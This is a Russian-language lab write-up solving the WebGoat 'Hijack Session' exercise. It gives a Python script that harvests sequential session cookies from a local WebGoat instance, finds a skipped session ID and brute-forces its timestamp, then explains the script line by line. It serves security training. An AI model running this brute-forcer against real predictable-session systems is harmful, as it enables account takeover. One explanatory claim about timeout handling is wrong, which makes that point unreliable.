@@ -1,0 +1,587 @@
+### Цели
+Получить доступ к авторизованной сессии, принадлежащей другому лицу.
+
+![[Pasted image 20260503085745.png]]
+
+![[Pasted image 20260503085720.png]]
+
+hijack_cookie=7499240672216088162-1777773278905
+
+![[Pasted image 20260503091655.png]]
+
+![[Pasted image 20260503091737.png]]
+
+7499240672216088307-1777774634233
+7499240672216088310-1777774684542
+7499240672216088311-1777774703905
+7499240672216088312-1777774725327
+7499240672216088313-1777774753190
+7499240672216088314-1777774770568
+
+Создадим скрипт *hijjack_solving.py* на python3:
+
+##### Скрипт *hijjack_solver.py*
+```
+#!/usr/bin/env python3
+import requests
+import sys
+import time
+
+# ================= CONFIGURATION =================
+BASE_URL = "http://127.0.0.1:8001"
+LOGIN_PATH = "/WebGoat/HijackSession/login"   # exact case as in curl output
+USERNAME = "username"          # from your working curl
+PASSWORD = "username1"         # from your working curl
+JSESSIONID = "EB470B908C0274C33BEA2AE192756D1C"  # fresh from curl
+MAX_REQUESTS = 1000
+# =================================================
+
+def get_hijack_cookie(session):
+    """Send login request, return hijack_cookie from response cookies."""
+    url = f"{BASE_URL}{LOGIN_PATH}"
+    params = {"username": USERNAME, "password": PASSWORD}
+    headers = {"X-Requested-With": "XMLHttpRequest"}
+
+    # Set JSESSIONID with correct path (case-sensitive)
+    session.cookies.set("JSESSIONID", JSESSIONID, domain="127.0.0.1", path="/WebGoat")
+
+    resp = session.post(url, params=params, headers=headers, timeout=5)
+    if resp.status_code != 200:
+        print(f"[!] HTTP {resp.status_code}, check WebGoat")
+        return None
+
+    # The cookie may or may not have a leading slash; keep as-is
+    return resp.cookies.get("hijack_cookie")
+
+def parse_cookie(cookie_value):
+    """Remove optional leading slash, then split into session_id and timestamp."""
+    if cookie_value.startswith('/'):
+        cookie_value = cookie_value[1:]
+    parts = cookie_value.split('-')
+    return int(parts[0]), int(parts[1])
+
+def try_hijack(session, session_id, timestamp):
+    """Attempt to login with guessed hijack_cookie."""
+    url = f"{BASE_URL}{LOGIN_PATH}"
+    params = {"username": USERNAME, "password": PASSWORD}
+    guessed_cookie = f"{session_id}-{timestamp}"   # without leading slash
+    session.cookies.set("hijack_cookie", guessed_cookie, domain="127.0.0.1", path="/WebGoat")
+    session.cookies.set("JSESSIONID", JSESSIONID, domain="127.0.0.1", path="/WebGoat")
+
+    resp = session.post(url, params=params, headers={"X-Requested-With": "XMLHttpRequest"})
+    data = resp.json()
+    if data.get("lessonCompleted"):
+        print(f"\n[+] SUCCESS! hijack_cookie = {guessed_cookie}")
+        return True
+    return False
+
+def main():
+    print("[*] Starting hijack_cookie brute-forcer...")
+    session = requests.Session()
+
+    prev_id = None
+    prev_ts = None
+    missing_id = None
+    start_ts = None
+    end_ts = None
+
+    for i in range(1, MAX_REQUESTS + 1):
+        cookie = get_hijack_cookie(session)
+        if not cookie:
+            print("[!] No hijack_cookie, retrying...")
+            time.sleep(0.5)
+            continue
+
+        try:
+            sess_id, ts = parse_cookie(cookie)
+        except Exception as e:
+            print(f"[!] Parse error: {e}, skipping")
+            continue
+
+        print(f"[{i:3d}] session_id = {sess_id}, timestamp = {ts}")
+
+        if prev_id is not None:
+            diff = sess_id - prev_id
+            if diff == 2:
+                missing_id = prev_id + 1
+                start_ts = prev_ts
+                end_ts = ts
+                print(f"\n[+] GAP FOUND! Missing session ID = {missing_id}")
+                print(f"[+] Timestamp range: {start_ts} → {end_ts}\n")
+                break
+
+        prev_id, prev_ts = sess_id, ts
+
+    if missing_id is None:
+        print("[!] No gap of exactly 2 found. Increase MAX_REQUESTS or restart WebGoat.")
+        sys.exit(1)
+
+    for ts in range(start_ts, end_ts + 1):
+        print(f"[*] Trying timestamp {ts}...")
+        if try_hijack(session, missing_id, ts):
+            print("\n[+] Lesson completed!")
+            return
+        time.sleep(0.1)
+
+    print("\n[-] No working hijack_cookie found in the timestamp range.")
+
+if __name__ == "__main__":
+    main()
+
+```
+
+Результат выполнения скрипта:
+
+![[Pasted image 20260503211501.png]]
+
+![[Pasted image 20260503211526.png]]
+
+
+# Разбор скрипта hijack solver
+
+Давайте разберём **каждую строчку** финального скрипта, который мы написали. Я объясню, зачем нужна каждая инструкция, какие параметры она принимает, что может пойти не так, и как это связано с атакой на WebGoat.
+
+Вот полный код скрипта (я его немного отформатировал для удобства):
+
+```python
+#!/usr/bin/env python3
+import requests
+import sys
+import time
+
+BASE_URL = "http://127.0.0.1:8001"
+LOGIN_PATH = "/WebGoat/HijackSession/login"
+USERNAME = "username"
+PASSWORD = "username1"
+JSESSIONID = "E8470B908C0274C33BEA2AE192756D1C"
+MAX_REQUESTS = 1000
+
+def get_hijack_cookie(session):
+    url = f"{BASE_URL}{LOGIN_PATH}"
+    params = {"username": USERNAME, "password": PASSWORD}
+    headers = {"X-Requested-With": "XMLHttpRequest"}
+    session.cookies.set("JSESSIONID", JSESSIONID, domain="127.0.0.1", path="/WebGoat")
+    resp = session.post(url, params=params, headers=headers, timeout=5)
+    if resp.status_code != 200:
+        print(f"[!] HTTP {resp.status_code}, сервер вернул ошибку")
+        return None
+    hijack_cookie = resp.cookies.get("hijack_cookie")
+    return hijack_cookie
+
+def parse_cookie(cookie_value):
+    if cookie_value.startswith('/'):
+        cookie_value = cookie_value[1:]
+    parts = cookie_value.split('-')
+    if len(parts) != 2:
+        raise ValueError(f"Неверный формат: {cookie_value}")
+    return int(parts[0]), int(parts[1])
+
+def try_hijack(session, session_id, timestamp):
+    url = f"{BASE_URL}{LOGIN_PATH}"
+    params = {"username": USERNAME, "password": PASSWORD}
+    guessed_cookie = f"{session_id}-{timestamp}"
+    session.cookies.set("hijack_cookie", guessed_cookie, domain="127.0.0.1", path="/WebGoat")
+    session.cookies.set("JSESSIONID", JSESSIONID, domain="127.0.0.1", path="/WebGoat")
+    resp = session.post(url, params=params, headers={"X-Requested-With": "XMLHttpRequest"})
+    data = resp.json()
+    return data.get("lessonCompleted", False)
+
+def main():
+    session = requests.Session()
+    prev_id = None
+    prev_ts = None
+    missing_id = None
+    start_ts = None
+    end_ts = None
+
+    for i in range(1, MAX_REQUESTS + 1):
+        cookie = get_hijack_cookie(session)
+        if not cookie:
+            time.sleep(0.5)
+            continue
+
+        try:
+            sess_id, ts = parse_cookie(cookie)
+        except Exception as e:
+            print(f"[!] Ошибка парсинга: {e}, пропускаем")
+            continue
+
+        print(f"[{i:3d}] session_id = {sess_id}, timestamp = {ts}")
+
+        if prev_id is not None:
+            diff = sess_id - prev_id
+            if diff == 2:
+                missing_id = prev_id + 1
+                start_ts = prev_ts
+                end_ts = ts
+                print(f"\n[+] Найден пропуск! ID = {missing_id}")
+                print(f"[+] Диапазон timestamp: {start_ts} → {end_ts}\n")
+                break
+
+        prev_id, prev_ts = sess_id, ts
+
+    if missing_id is None:
+        print("[!] Не нашли разрыв. Попробуйте увеличить MAX_REQUESTS.")
+        sys.exit(1)
+
+    for ts in range(start_ts, end_ts + 1):
+        print(f"[*] Пробуем timestamp {ts}...")
+        if try_hijack(session, missing_id, ts):
+            print(f"\n[+] Успех! hijack_cookie = {missing_id}-{ts}")
+            return
+        time.sleep(0.1)
+
+    print("\n[-] Не удалось найти правильный hijack_cookie.")
+
+if __name__ == "__main__":
+    main()
+```
+
+Теперь разберём **каждую строчку**:
+
+---
+
+## 1. Shebang и импорты
+
+```python
+#!/usr/bin/env python3
+```
+- **Shebang**: указывает системе, что этот файл нужно выполнять с помощью интерпретатора Python 3. Работает в Unix/Linux. На Windows обычно игнорируется.
+
+```python
+import requests
+```
+- Импортирует библиотеку `requests`, которая позволяет легко отправлять HTTP-запросы (GET, POST и т.д.). Без неё пришлось бы использовать встроенный `urllib`, что сложнее.
+
+```python
+import sys
+```
+- Импортирует модуль `sys` для доступа к системным функциям. Нам понадобится `sys.exit(1)` для аварийного выхода из программы с кодом ошибки.
+
+```python
+import time
+```
+- Импортирует модуль `time` для пауз между запросами (`time.sleep()`). Паузы нужны, чтобы не перегружать сервер и не получить блокировку.
+
+---
+
+## 2. Глобальные константы (конфигурация)
+
+```python
+BASE_URL = "http://127.0.0.1:8001"
+```
+- Базовый адрес, где работает WebGoat. `127.0.0.1` – локальная машина. Порт `8001` – из твоего рабочего примера. Если WebGoat на другом порту (например, 8080), нужно изменить.
+
+```python
+LOGIN_PATH = "/WebGoat/HijackSession/login"
+```
+- Путь к эндпоинту логина. **Регистр важен**: `/WebGoat` с большой буквы W и G, как в ответе сервера. В некоторых версиях может быть `/webGoat` – сверь с браузером.
+
+```python
+USERNAME = "username"
+PASSWORD = "username1"
+```
+- Учётные данные, которые работают в твоём curl-запросе. В уроке может быть `username1` / `username1`, но у тебя сработало с `username` / `username1`. Используй те, которые дают `hijack_cookie`.
+
+```python
+JSESSIONID = "E8470B908C0274C33BEA2AE192756D1C"
+```
+- Сессионная cookie, которую ты получаешь после входа в WebGoat. Без неё сервер не поймёт, что ты аутентифицирован. **Должна быть свежей** – можно скопировать из браузера после логина.
+
+```python
+MAX_REQUESTS = 1000
+```
+- Сколько раз мы попытаемся получить `hijack_cookie`, чтобы найти разрыв (gap). Если за 1000 попыток разрыв не найден, скрипт завершится с ошибкой. Можно увеличить.
+
+---
+
+## 3. Функция `get_hijack_cookie(session)`
+
+```python
+def get_hijack_cookie(session):
+```
+- Определение функции, которая принимает объект `session` (экземпляр `requests.Session()`). Сессия хранит cookies между вызовами.
+
+```python
+    url = f"{BASE_URL}{LOGIN_PATH}"
+```
+- Склеиваем базовый URL и путь: `http://127.0.0.1:8001/WebGoat/HijackSession/login`. f-строка подставляет значения.
+
+```python
+    params = {"username": USERNAME, "password": PASSWORD}
+```
+- Параметры запроса, которые будут добавлены в строку URL после знака `?`. Например: `?username=username&password=username1`. Это именно query parameters, не тело запроса.
+
+```python
+    headers = {"X-Requested-With": "XMLHttpRequest"}
+```
+- Заголовок, который сервер проверяет, чтобы убедиться, что запрос пришёл через AJAX. Без него WebGoat не установит `hijack_cookie`. Можно также добавить `User-Agent`, но не обязательно.
+
+```python
+    session.cookies.set("JSESSIONID", JSESSIONID, domain="127.0.0.1", path="/WebGoat")
+```
+- Устанавливаем cookie `JSESSIONID` внутри сессии. Параметры:
+  - `domain` – для какого домена действует cookie. Обычно `127.0.0.1`.
+  - `path` – путь, для которого cookie действительна. Сервер ожидает `path="/WebGoat"`. Если указать другой путь, cookie может не отправиться.
+  - Без явного указания domain/path requests может установить cookie только для точного URL, но лучше задать явно.
+
+```python
+    resp = session.post(url, params=params, headers=headers, timeout=5)
+```
+- Отправляем POST-запрос:
+  - `url` – куда шлём.
+  - `params` – превращаются в query string.
+  - `headers` – добавляем свои заголовки.
+  - `timeout=5` – ждать ответа не более 5 секунд, иначе выбросить исключение. Защита от зависания.
+
+```python
+    if resp.status_code != 200:
+        print(f"[!] HTTP {resp.status_code}, сервер вернул ошибку")
+        return None
+```
+- Проверяем статус ответа. 200 = OK. Если другое (404, 500 и т.д.), выводим сообщение и возвращаем `None` (сигнал, что cookie не получена).
+
+```python
+    hijack_cookie = resp.cookies.get("hijack_cookie")
+```
+- Извлекаем из ответа cookie с именем `hijack_cookie`. Метод `resp.cookies` возвращает объект `RequestsCookieJar`, у которого есть метод `.get(name)`.
+
+```python
+    return hijack_cookie
+```
+- Возвращаем значение cookie (строку) или `None`, если cookie не было.
+
+---
+
+## 4. Функция `parse_cookie(cookie_value)`
+
+```python
+def parse_cookie(cookie_value):
+```
+- Принимает строку – значение `hijack_cookie`.
+
+```python
+    if cookie_value.startswith('/'):
+        cookie_value = cookie_value[1:]
+```
+- Если строка начинается со слеша (например, `/7499...-1234`), то отрезаем первый символ (слеш). В разных версиях WebGoat может быть слеш или нет.
+
+```python
+    parts = cookie_value.split('-')
+```
+- Разбиваем строку по дефису. Например: `"7499240672216088657-1777817126781"` → `["7499240672216088657", "1777817126781"]`.
+
+```python
+    if len(parts) != 2:
+        raise ValueError(f"Неверный формат: {cookie_value}")
+```
+- Если получилось не 2 части – формат неправильный, выбрасываем исключение. Это защита от ошибочных данных.
+
+```python
+    return int(parts[0]), int(parts[1])
+```
+- Преобразуем обе части в целые числа и возвращаем кортеж `(session_id, timestamp)`.
+
+---
+
+## 5. Функция `try_hijack(session, session_id, timestamp)`
+
+```python
+def try_hijack(session, session_id, timestamp):
+```
+- Принимает сессию, предполагаемый ID и временную метку.
+
+```python
+    url = f"{BASE_URL}{LOGIN_PATH}"
+    params = {"username": USERNAME, "password": PASSWORD}
+```
+- Аналогично, формируем URL и параметры.
+
+```python
+    guessed_cookie = f"{session_id}-{timestamp}"
+```
+- Склеиваем ID и метку через дефис. **Без ведущего слеша**, потому что сервер ожидает именно такой формат? На самом деле, иногда слеш нужен. Но из рабочего curl видно, что сервер устанавливает cookie без слеша (в ответе `Set-Cookie: hijack_cookie=7499...`). Поэтому мы подставляем без слеша.
+
+```python
+    session.cookies.set("hijack_cookie", guessed_cookie, domain="127.0.0.1", path="/WebGoat")
+```
+- Перезаписываем cookie `hijack_cookie` на нашу догадку.
+
+```python
+    session.cookies.set("JSESSIONID", JSESSIONID, domain="127.0.0.1", path="/WebGoat")
+```
+- Ещё раз явно устанавливаем JSESSIONID (на всякий случай, хотя она уже есть в сессии).
+
+```python
+    resp = session.post(url, params=params, headers={"X-Requested-With": "XMLHttpRequest"})
+```
+- Отправляем запрос с подставленной cookie.
+
+```python
+    data = resp.json()
+```
+- Парсим тело ответа как JSON. Ожидаем словарь с ключами типа `lessonCompleted`, `feedback` и т.д.
+
+```python
+    return data.get("lessonCompleted", False)
+```
+- Возвращаем значение ключа `lessonCompleted`, если он есть, иначе `False`. Если `True`, значит угадали.
+
+---
+
+## 6. Функция `main()`
+
+```python
+def main():
+```
+- Главная функция, где происходит вся логика.
+
+```python
+    session = requests.Session()
+```
+- Создаём объект сессии. Он будет автоматически хранить и отправлять cookies между запросами. Это удобнее, чем каждый раз создавать новый `requests` и вручную копировать cookies.
+
+```python
+    prev_id = None
+    prev_ts = None
+    missing_id = None
+    start_ts = None
+    end_ts = None
+```
+- Инициализируем переменные для хранения предыдущей пары (ID, timestamp), пропущенного ID, начала и конца диапазона timestamp.
+
+### Цикл сбора hijack_cookie
+
+```python
+    for i in range(1, MAX_REQUESTS + 1):
+```
+- Цикл от 1 до MAX_REQUESTS включительно. Переменная `i` – номер итерации (используется только для вывода).
+
+```python
+        cookie = get_hijack_cookie(session)
+```
+- Вызываем функцию, получаем новое значение cookie или `None`.
+
+```python
+        if not cookie:
+            time.sleep(0.5)
+            continue
+```
+- Если cookie нет (сетевая ошибка или сервер не отдал), ждём полсекунды и переходим к следующей итерации (пробуем ещё раз).
+
+```python
+        try:
+            sess_id, ts = parse_cookie(cookie)
+        except Exception as e:
+            print(f"[!] Ошибка парсинга: {e}, пропускаем")
+            continue
+```
+- Пытаемся распарсить cookie. Если возникает любое исключение (например, неправильный формат), выводим ошибку и пропускаем эту итерацию.
+
+```python
+        print(f"[{i:3d}] session_id = {sess_id}, timestamp = {ts}")
+```
+- Выводим отформатированную строку. `{i:3d}` означает: вывести число `i`, выделив под него 3 символа (для выравнивания). Например: `[  1]`, `[ 10]`, `[100]`.
+
+```python
+        if prev_id is not None:
+```
+- Проверяем, есть ли предыдущий ID (т.е. это не первый запрос).
+
+```python
+            diff = sess_id - prev_id
+```
+- Вычисляем разницу между текущим и предыдущим ID.
+
+```python
+            if diff == 2:
+```
+- Если разница равна 2 – нашли пропуск.
+
+```python
+                missing_id = prev_id + 1
+                start_ts = prev_ts
+                end_ts = ts
+```
+- Пропущенный ID = предыдущий + 1. Начало диапазона timestamp – предыдущий timestamp, конец – текущий.
+
+```python
+                print(f"\n[+] Найден пропуск! ID = {missing_id}")
+                print(f"[+] Диапазон timestamp: {start_ts} → {end_ts}\n")
+                break
+```
+- Выводим радостное сообщение и выходим из цикла `for` (прерываем сбор).
+
+```python
+        prev_id, prev_ts = sess_id, ts
+```
+- Если разрыв не найден, запоминаем текущие значения как предыдущие для следующей итерации.
+
+### После цикла сбора
+
+```python
+    if missing_id is None:
+        print("[!] Не нашли разрыв. Попробуйте увеличить MAX_REQUESTS.")
+        sys.exit(1)
+```
+- Если мы вышли из цикла, но `missing_id` так и остался `None` (не нашли разрыв за MAX_REQUESTS), выводим сообщение и завершаем программу с кодом ошибки 1.
+
+### Брутфорс timestamp
+
+```python
+    for ts in range(start_ts, end_ts + 1):
+```
+- Цикл по всем timestamp от начала до конца ВКЛЮЧИТЕЛЬНО (т.к. `range` не включает верхнюю границу, делаем `+1`).
+
+```python
+        print(f"[*] Пробуем timestamp {ts}...")
+        if try_hijack(session, missing_id, ts):
+            print(f"\n[+] Успех! hijack_cookie = {missing_id}-{ts}")
+            return
+```
+- Для каждой метки пробуем подставить cookie. Если `try_hijack` вернул `True`, выводим успех и выходим из функции `main()` (и, следовательно, из программы).
+
+```python
+        time.sleep(0.1)
+```
+- Небольшая пауза 0.1 секунды между попытками, чтобы не создавать слишком высокую нагрузку на сервер.
+
+```python
+    print("\n[-] Не удалось найти правильный hijack_cookie.")
+```
+- Если ни одна метка не подошла, выводим сообщение об неудаче.
+
+---
+
+## 7. Запуск
+
+```python
+if __name__ == "__main__":
+    main()
+```
+- Это стандартная конструкция: если файл запущен как основная программа (а не импортирован как модуль), то вызываем `main()`. Так можно импортировать функции из этого скрипта в другие программы, не запуская атаку автоматически.
+
+---
+
+## 🧠 Дополнительные пояснения
+
+### Зачем нужен `requests.Session()`?
+Обычный `requests.get()` не сохраняет cookies. Сессия же автоматически запоминает все cookies, которые приходят от сервера, и отправляет их в следующих запросах. Нам это нужно, потому что сервер может менять какие-то cookies, и мы хотим быть «похожими» на браузер.
+
+### Почему мы используем `params`, а не `data` или `json`?
+В `curl`, который сработал, параметры были в URL (после `?`). Метод `params` в `requests` делает именно это. Если бы мы использовали `data`, параметры ушли бы в тело запроса (как при отправке формы), и сервер бы их не понял.
+
+### Что такое `timeout=5`?
+Это максимальное время ожидания ответа от сервера в секундах. Если сервер не отвечает, `requests` выбросит исключение `ConnectTimeout` или `ReadTimeout`. Мы не обрабатываем его явно, но наша функция `get_hijack_cookie` в случае исключения вернёт `None`, и цикл просто повторит попытку.
+
+### Почему после нахождения разрыва мы сразу выходим из цикла `for`, а не продолжаем собирать данные?
+Потому что для брутфорса нам нужен только один диапазон timestamp. Продолжать нет смысла – мы уже знаем пропущенный ID и интервал.
+
+### Что если диапазон timestamp очень большой (например, миллион)?
+На практике timestamp близки друг к другу (разница в десятки-сотни единиц). Если диапазон слишком велик, возможно, сервер использует миллисекунды, и нужно перебирать с шагом? Но в WebGoat разница небольшая, и наш перебор с шагом 1 работает.
+
+### Что делать, если разрыв никогда не находится?
+В WebGoat задание построено так, что пропуск генерируется в течение первых ~100 запросов. Если его нет – возможно, сервер уже «ушел» в другую последовательность. Перезапусти урок (кнопка Reset lesson) и запусти скрипт заново. Также можно увеличить `MAX_REQUESTS` до 2000.
+
+---
+
